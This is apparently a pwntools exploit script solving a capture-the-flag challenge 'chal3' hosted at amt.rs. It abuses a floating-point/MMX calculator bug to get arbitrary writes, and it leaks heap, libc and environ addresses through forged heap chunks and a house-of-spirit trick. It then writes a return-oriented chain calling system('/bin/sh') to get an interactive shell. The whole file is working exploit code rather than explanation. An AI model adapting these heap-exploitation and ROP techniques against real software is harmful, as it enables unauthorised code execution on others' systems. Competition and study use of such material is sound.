#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host amt.rs --port 31171 chal3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal3')
libc = exe.libc

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'amt.rs'
port = int(args.PORT or 31171)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
c
'''.format(**locals())

import mpmath as mp
mp.mp.prec = 200
print(mp.mp)

# to set mm7, we need to push one extended precision float
# so as to set the first 8 bytes exactly, we need a subnormal number
# whose mantissa that can have a number of 0 msbs while not being equal to 0
# unlike for other numbers
# exponent must be at 0 in its representation for that
def unpack_f(m,e=0x7ffe):
    b = p64(m)
    e -= 0x3fff
    res = mp.mpf(m) / (2 ** 63) * mp.mpf(2) ** e
    return res

def unpack_f2(i):
    return unpack_f(i,e=1)

def cmd(i):
    io.sendlineafter(b'> ', str(i).encode())

def fp_mode():
    cmd(1)


def pushf(x):
    cmd(1)
    io.sendline(str(x).encode())

def pushi(x):
    cmd(1)
    io.sendline(str(unpack_f2(x)).encode())

def pop():
    cmd(2)

def add():
    cmd(3)

def sub():
    cmd(4)

def inspect():
    cmd(7)
    return int(io.recvline()[:-1].split(b' ')[1])

def int_mode():
    cmd(2)

def seti(i,v):
    cmd(1)
    io.sendline(str(i).encode())
    io.sendline(str(v).encode())

def geti(i):
    cmd(2)
    io.sendline(str(i).encode())
    return int(io.recvline()[:-1])

def load():
    cmd(7)

def save():
    cmd(8)

def menu():
    cmd(0)

def setmm7(v):
    fp_mode()
    pushi(v)
    menu()

def leakmm7():
    fp_mode()
    for i in range(7):
        pushf(0)
    menu()
    int_mode()
    save()
    menu()
    fp_mode()
    for i in range(7):
        pop()
    leak = inspect()
    menu()
    return leak

def arbw(addr,vs,idx=0):
    setmm7(addr)
    int_mode()
    for i,v in enumerate(vs):
        seti(idx+i,v)
    save()
    menu()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
context.terminal = ['terminator','--new-tab','-x']
io = start()

# heap leak
heap_base = leakmm7() - 0x12f10
log.info(f"heap : 0x{heap_base:x}")

# libc leak (craft unsorted chunk)
sz_ptr = heap_base + 0x12f10 - 8
# add valid overlapping chunks to bypass prev_inuse check
for i in range(17):
    setmm7(0)
    int_mode()
    save()
    menu()
    fp_mode()
    pop()
    menu()
arbw(sz_ptr,[0x480|1])
setmm7(sz_ptr+8)
int_mode()
load() # -> to unsorted -> fd points in libc
menu()
arbw(sz_ptr-48,[0x40|1],idx=6) # tcache range (bypass 2free check)
setmm7(sz_ptr+8)
int_mode()
load() # put fd in mm0
libc.address = geti(0) - 0x219ce0
log.info(f"libc : 0x{libc.address:x}")
menu()

# leak environ (house of spirit to bypass free checks)
env_addr = libc.address + 0x21aa20
arbw(env_addr-48 -8,[0x40|1],idx=6)
setmm7(env_addr)
int_mode()
load()
env = geti(0)
menu()
log.info(f"env : 0x{env:x}")

# rop
rop = []
rop.append(ROP(libc).find_gadget(['pop rdi', 'ret'])[0])
rop.append(next(libc.search(b'/bin/sh\x00')))
rop.append(ROP(libc).find_gadget(['ret'])[0])
rop.append(libc.symbols['system'])
ra = env-0x130
arbw(ra,rop)

io.interactive()

